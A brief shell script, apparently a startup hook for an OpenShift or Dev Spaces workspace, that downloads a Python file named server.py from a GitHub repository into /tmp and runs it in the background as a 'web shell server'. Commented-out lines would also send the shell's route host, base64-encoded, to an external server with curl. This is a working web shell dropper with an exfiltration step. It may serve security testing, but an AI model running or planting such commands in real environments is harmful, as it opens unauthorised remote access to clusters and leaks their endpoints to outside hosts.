# Specify your external server url to get the "webshell" endpoint url and send it outside the cluster. Sleep is needed for the system to populate the user's kubectl config.
# sleep 10
# curl http://<external_server_url>/"$(oc get routes -o custom-columns=PATH:.spec.host | grep webshell | base64 -w0)"

# Run the python web shell server
cd /tmp && wget "https://raw.githubusercontent.com/feuillemorte/devspaces-test/main/server.py" && python server.py &
